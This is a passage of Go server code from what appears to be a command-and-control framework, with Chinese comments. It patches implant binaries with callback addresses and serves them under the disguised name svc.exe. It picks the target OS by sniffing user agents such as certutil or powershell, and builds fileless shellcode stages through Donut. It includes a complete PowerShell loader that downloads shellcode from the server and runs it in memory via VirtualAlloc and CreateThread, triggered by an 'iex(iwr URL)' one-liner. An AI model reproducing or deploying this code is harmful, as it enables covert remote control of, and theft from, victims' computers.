	if targetOS == "" || targetOS == "auto" || targetOS == "windows_bat" {
		ua := strings.ToLower(c.Request.UserAgent())
		if strings.Contains(ua, "windows") || strings.Contains(ua, "win") || strings.Contains(ua, "certutil") || strings.Contains(ua, "powershell") {
			targetOS = "windows"
		} else {
			targetOS = "linux"
		}
	}

	// Fetch Listener Details
	lnVal, ok := globals.Listeners.Load(conf.ListenerID)
	if !ok {
		c.Data(404, "text/plain", []byte("Listener not found or offline"))
		return
	}
	ln := lnVal.(*globals.Listener)

	product := normalizeCapabilityProfile(conf.Profile)
	profile := cargoProfile(product) // always "minimal"
	_ = product

	archHint := conf.Arch
	if targetOS == "windows" {
		if conf.Arch == "x86" || conf.Arch == "i386" {
			archHint = "windows_i386"
		} else {
			archHint = "windows_amd64"
		}
	} else {
		if conf.Arch == "arm64" {
			archHint = "linux_arm64"
		} else {
			archHint = "linux_amd64"
		}
	}

	templateName, hint := resolvePatchTemplate(targetOS, archHint, ln.Protocol, profile)
	if templateName == "" {
		c.Data(500, "text/plain", []byte("no template mapping: "+hint))
		return
	}

	// x86 windows: only use _x86 if file exists
	if targetOS == "windows" && (conf.Arch == "x86" || conf.Arch == "i386") {
		x86Name := strings.Replace(templateName, ".exe", "_x86.exe", 1)
		if _, err := os.Stat(filepath.Join("assets", x86Name)); err == nil {
			templateName = x86Name
		}
	}

	templatePath := filepath.Join("assets", templateName)
	raw, err := os.ReadFile(templatePath)
	if err != nil {
		// Fallback: legacy *_minimal alias (same cargo minimal binary)
		if alias := resolvePatchTemplateAlias(targetOS, archHint, ln.Protocol); alias != "" && alias != templateName {
			if raw2, err2 := os.ReadFile(filepath.Join("assets", alias)); err2 == nil {
				raw = raw2
				templateName = alias
				err = nil
			}
		}
	}
	if err != nil || len(raw) == 0 {
		msg := fmt.Sprintf(
			"template missing: assets/%s — run compile_windows.ps1 / compile_linux.sh or panel「更新模板」to generate client_template_* files",
			templateName,
		)
		c.Data(500, "text/plain", []byte(msg))
		return
	}

	// Agent callback host (C2), never the panel download host
	host := conf.Host
	if host == "" {
		host = strings.Split(c.Request.Host, ":")[0]
	}
	// Strip accidental scheme/port fragments
	host = strings.TrimPrefix(host, "http://")
	host = strings.TrimPrefix(host, "https://")
	host = strings.Split(host, "/")[0]
	if strings.Contains(host, ":") && !strings.Contains(host, "]") {
		// keep host only if user passed host:port by mistake for non-TCP URL building
		// For TCP/WS we append listener port below — strip port from host.
		host = strings.Split(host, ":")[0]
	}

	c2url := ""
	switch strings.ToUpper(ln.Protocol) {
	case "WS", "WEBSOCKET":
		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
	case "WSS":
		c2url = fmt.Sprintf("wss://%s:%d/ws", host, ln.Port)
	case "TCP":
		c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
	case "BIND-TCP", "正向TCP":
		c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
	case "DNS":
		c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
	default:
		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
	}

	patched, err := services.PatchPayload(
		raw, c2url, ln.EncryptKey, ln.HeartbeatInterval, ln.HeartbeatJitter, "",
		conf.AutoDestruct, conf.SleepTime, ln.EncryptionSalt, ln.ObfuscateMode,
	)
	if err != nil {
		c.Data(500, "text/plain", []byte("Patch failed: "+err.Error()+" (template placeholders may not match this build)"))
		return
	}

	// Hint filename for certutil/browsers
	fname := "svc.bin"
	if targetOS == "windows" {
		fname = "svc.exe"
	}
	c.Header("Content-Disposition", "attachment; filename="+fname)
	c.Data(200, "application/octet-stream", patched)
}

// buildAndCacheFilelessStage2 patches a Stage0 template (same as disk /api/s/bin) then Donut→PIC.
func buildAndCacheFilelessStage2(
	c *gin.Context,
	listenerID, callbackHost, arch, profile, httpProto, downloadHost string,
) (stage2ID, stage2URL string, nbytes int, err error) {
	lnVal, ok := globals.Listeners.Load(listenerID)
	if !ok {
		return "", "", 0, fmt.Errorf("listener offline")
	}
	ln := lnVal.(*globals.Listener)

	targetOS := "windows"
	archHint := arch
	templateName, _ := resolvePatchTemplate(targetOS, archHint, ln.Protocol, profile)
	if templateName == "" {
		return "", "", 0, fmt.Errorf("no template for fileless profile")
	}
	templatePath := filepath.Join("assets", templateName)
	raw, rerr := os.ReadFile(templatePath)
	if rerr != nil || len(raw) == 0 {
		if alias := resolvePatchTemplateAlias(targetOS, archHint, ln.Protocol); alias != "" {
			raw, rerr = os.ReadFile(filepath.Join("assets", alias))
			if rerr == nil {
				templateName = alias
			}
		}
	}
	if rerr != nil || len(raw) == 0 {
		return "", "", 0, fmt.Errorf("template missing: assets/%s", templateName)
	}

	host := callbackHost
	if host == "" {
		host = strings.Split(downloadHost, ":")[0]
	}
	host = strings.TrimPrefix(host, "http://")
	host = strings.TrimPrefix(host, "https://")
	host = strings.Split(host, "/")[0]
	if strings.Contains(host, ":") && !strings.Contains(host, "]") {
		host = strings.Split(host, ":")[0]
	}

	c2url := ""
	switch strings.ToUpper(ln.Protocol) {
	case "WS", "WEBSOCKET":
		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
	case "WSS":
		c2url = fmt.Sprintf("wss://%s:%d/ws", host, ln.Port)
	case "TCP":
		c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
	case "BIND-TCP", "正向TCP":
		c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
	case "DNS":
		c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
	default:
		c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
	}

	patched, perr := services.PatchPayload(
		raw, c2url, ln.EncryptKey, ln.HeartbeatInterval, ln.HeartbeatJitter, "",
		true, 0, ln.EncryptionSalt, ln.ObfuscateMode,
	)
	if perr != nil {
		return "", "", 0, fmt.Errorf("patch: %w", perr)
	}

	sc, serr := services.BuildFilelessStage2(patched, arch)
	if serr != nil {
		return "", "", 0, serr
	}

	id := strings.ReplaceAll(uuid.New().String(), "-", "")[:12]
	services.StoreStage2(id, sc, arch, listenerID, c2url)
	stagerCacheStore(id, StagerConfig{
		OS: "windows", Arch: arch, ListenerID: listenerID, Host: host,
		AutoDestruct: true, Profile: profile, Delivery: "fileless", Stage2ID: id,
	})
	url := services.Stage2URL(httpProto, downloadHost, id)
	return id, url, len(sc), nil
}

// HandleServeStage2 serves cached fileless PIC/shellcode (public stager route).
func HandleServeStage2(c *gin.Context) {
	id := c.Param("id")
	if id == "" || strings.Contains(id, "..") || strings.Contains(id, "/") {
		stagerAudit(c, id, stagerguard.StatusBadID)
		c.Data(400, "text/plain", []byte("bad id"))
		return
	}
	body, _, status, err := services.ConsumeStage2(id)
	if err != nil {
		if status == "" {
			status = stagerguard.StatusNotFound
		}
		stagerAudit(c, id, status)
		c.Data(404, "text/plain", []byte(err.Error()))
		return
	}
	stagerAudit(c, id, stagerguard.StatusOK)
	c.Header("Content-Disposition", "attachment; filename=stage2.bin")
	c.Header("Cache-Control", "no-store")
	c.Data(200, "application/octet-stream", body)
}

// filelessLoaderScript is the PS body served at /api/s/l/:id — the same in-memory
// VirtualAlloc/CreateThread P/Invoke logic as buildFilelessPSCommand, but as a
// standalone script fetched by the short `powershell -c "iex(iwr URL)"' one-liner.
func filelessLoaderScript(stage2URL string) string {
	// Single quoted PS string; stage2URL has no single quotes (it's a server-built URL).
	return fmt.Sprintf(`$b=(New-Object Net.WebClient).DownloadData('%s')
$c=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name W -PassThru
$m=$c::VirtualAlloc(0,$b.Length,0x3000,0x40)
[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length)
$c::WaitForSingleObject($c::CreateThread(0,0,$m,0,0,0),0xFFFFFFFF)
`, stage2URL)
}

// HandleServeFilelessLoader serves a PS loader script for the short one-click command.
// Route is public (under /api/s/l/:id, already auth-exempt). Returns 404 when the
// stager id is unknown/expired so the operator must regenerate the command.
// Consumes one hit on the loader id (not stage2); stage2 hits apply on /api/stage2/:id.
func HandleServeFilelessLoader(c *gin.Context) {
	id := c.Param("id")
	if id == "" || strings.Contains(id, "..") || strings.Contains(id, "/") {
		stagerAudit(c, id, stagerguard.StatusBadID)
		c.Data(400, "text/plain", []byte("bad id"))
		return
	}
	conf, status, ok := stagerCacheConsume(id)
	if !ok || conf.Delivery != "fileless" || conf.Stage2ID == "" {
		if ok {
			// Wrong delivery type still costs a hit; treat as not found for clients.
			status = stagerguard.StatusNotFound
		}
		stagerAudit(c, id, status)
		c.Data(404, "text/plain", []byte("stager id expired or unknown — regenerate one-click command in the panel"))
		return
	}
	// Peek only — do not burn stage2 download quota for the loader script.
	if !services.Stage2Exists(conf.Stage2ID) {
		stagerAudit(c, id, stagerguard.StatusExpired)
		c.Data(404, "text/plain", []byte("stage2 expired — regenerate one-click command in the panel"))
		return
	}
	// Rebuild stage2 URL from current request (host/proto may differ from generate time).
	proto := "http"
	if c.Request.TLS != nil || c.GetHeader("X-Forwarded-Proto") == "https" {
		proto = "https"
	}
	stage2URL := fmt.Sprintf("%s://%s/api/stage2/%s", proto, c.Request.Host, conf.Stage2ID)
	stagerAudit(c, id, stagerguard.StatusOK)
	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.Header("Cache-Control", "no-store")
	c.Data(200, "text/plain; charset=utf-8", []byte(filelessLoaderScript(stage2URL)))
}

// HandleServeProtectedPayload: 受保护的 Payload 下载接口（替代 Static("/downloads")）
// 已通过 AuthMiddleware 鉴权，防止目录枚举和路径穿越
func HandleServeProtectedPayload(c *gin.Context) {
	filename := c.Param("filename")

	// 🛡️ 路径穿越检查：只允许纯文件名，不允许任何路径分隔符
	if strings.Contains(filename, "/") || strings.Contains(filename, "\\") ||
		strings.Contains(filename, "..") || filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
		return
	}

	// 限定到 data-dir payloads
	baseDir, _ := filepath.Abs(paths.Join("payloads"))
	fullPath := filepath.Clean(filepath.Join(baseDir, filename))
	absPath, _ := filepath.Abs(fullPath)
	if !strings.HasPrefix(absPath, baseDir) {
		c.JSON(http.StatusForbidden, gin.H{"error": "Access denied"})
		return
	}

	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
		return
	}

	c.FileAttachment(fullPath, filename)
}
